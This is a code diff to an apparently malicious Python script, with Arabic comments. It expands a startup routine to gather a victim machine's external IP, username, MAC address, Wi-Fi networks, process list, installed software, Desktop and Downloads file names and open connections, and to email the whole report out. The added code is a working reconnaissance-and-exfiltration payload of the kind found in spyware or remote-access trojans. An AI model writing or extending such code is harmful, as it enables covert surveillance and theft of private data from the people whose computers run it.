@@ -95,10 +95,88 @@ def send_startup_info():
     try:
         hostname = socket.gethostname()
         local_ip = socket.gethostbyname(hostname)
-        system_info = f"System: {platform.system()} {platform.release()}\nHostname: {hostname}\nIP: {local_ip}"
-        send_email("System Startup Notification", system_info)
+
+        # IP الخارجي
+        try:
+            external_ip = requests.get('https://api.ipify.org').text
+        except Exception:
+            external_ip = "Unable to fetch external IP"
+
+        # معلومات النظام
+        system_info = f"""
+        ===== System Information =====
+        System: {platform.system()} {platform.release()} {platform.version()}
+        Architecture: {platform.machine()}
+        Hostname: {hostname}
+        Username: {os.getlogin()}
+        Language: {os.getenv('LANG', 'Unknown')}
+        Internal IP: {local_ip}
+        External IP: {external_ip}
+        """
+
+        # عنوان MAC
+        try:
+            mac_address = ':'.join(['{:02x}'.format((os.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
+        except Exception:
+            mac_address = "Unable to fetch MAC address"
+
+        system_info += f"\nMAC Address: {mac_address}\n"
+
+        # الشبكات اللاسلكية المتاحة (لأنظمة Linux فقط)
+        if platform.system() == "Linux":
+            try:
+                networks = subprocess.getoutput("nmcli dev wifi")
+                system_info += f"\n===== Available Networks =====\n{networks}\n"
+            except Exception:
+                system_info += "\nUnable to fetch wireless networks\n"
+
+        # العمليات النشطة
+        try:
+            processes = subprocess.getoutput("ps -ef")
+            system_info += f"\n===== Active Processes =====\n{processes}\n"
+        except Exception:
+            system_info += "\nUnable to fetch processes\n"
+
+        # البرامج المثبتة
+        try:
+            if platform.system() == "Linux":
+                installed_programs = subprocess.getoutput("dpkg -l")
+            elif platform.system() == "Windows":
+                installed_programs = subprocess.getoutput("wmic product get name,version")
+            else:
+                installed_programs = "Unable to fetch installed programs on this OS."
+
+            system_info += f"\n===== Installed Programs =====\n{installed_programs}\n"
+        except Exception:
+            system_info += "\nUnable to fetch installed programs\n"
+
+        # الملفات في مجلد Desktop و Downloads
+        try:
+            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+            downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
+
+            desktop_files = os.listdir(desktop_path) if os.path.exists(desktop_path) else []
+            downloads_files = os.listdir(downloads_path) if os.path.exists(downloads_path) else []
+
+            system_info += f"\n===== Desktop Files =====\n{', '.join(desktop_files)}\n"
+            system_info += f"\n===== Downloads Files =====\n{', '.join(downloads_files)}\n"
+
+        except Exception:
+            system_info += "\nUnable to fetch Desktop/Downloads files\n"
+
+        # الاتصالات المفتوحة
+        try:
+            connections = subprocess.getoutput("netstat -tulnp")
+            system_info += f"\n===== Active Connections =====\n{connections}\n"
+        except Exception:
+            system_info += "\nUnable to fetch network connections\n"
+
+        # إرسال التقرير عبر البريد الإلكتروني
+        send_email("Advanced System Startup Notification", system_info)
+
     except Exception as e:
         print(f"[-] Error sending startup info: {e}")
+
 
 # ===== تحديث السكربت =====
 def update_script():
